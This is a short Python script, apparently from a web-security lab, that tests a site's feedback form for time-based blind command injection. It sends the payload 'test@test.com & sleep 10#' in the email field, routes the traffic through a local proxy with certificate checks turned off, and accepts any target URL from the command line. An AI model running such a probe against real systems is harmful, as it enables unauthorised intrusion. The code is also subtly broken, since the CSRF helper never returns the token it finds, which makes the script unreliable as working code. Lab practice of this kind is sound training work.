import sys
import requests
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}


#4
def get_csrf_token(s, url):
    feedback_path = '/feedback'
    r = s.get(url + feedback_path, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input")['value']


#3
def check_command_injection(s, url):
    submit_feedback_path = '/feedback/submit'
    command_injection = 'test@test.com & sleep 10#'
    csrf_token = get_csrf_token(s, url) # function to get csrf-token
    data = {'csrf': csrf_token, 'name':'test', 'email': command_injection, 'subject': 'test', 'message': 'test'}
    res = s.post(url + submit_feedback_path, data=data, verify=False, proxies=proxies)
    if (res.elapsed.total_seconds() >= 10):
        print("(+) command injection successful . . .")
    else:
        print("(-) failed . . . ")


#2
def main():
    if len(sys.argv) != 2:    # if length of "arguements in the CMD is NOT equaly to 2 "
        print("(+)Error -->> Usage: %s <url>" % sys.argv[0])  # ->| %s |<-  name of script
        print("(+)Error -->> Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1] # URL commandline arguement
    print("(+) checking if email param is vuln to time-based command injection . . . ")

    s = requests.Session()
    check_command_injection(s, url)


#1
if __name__ == "__main__":
    main()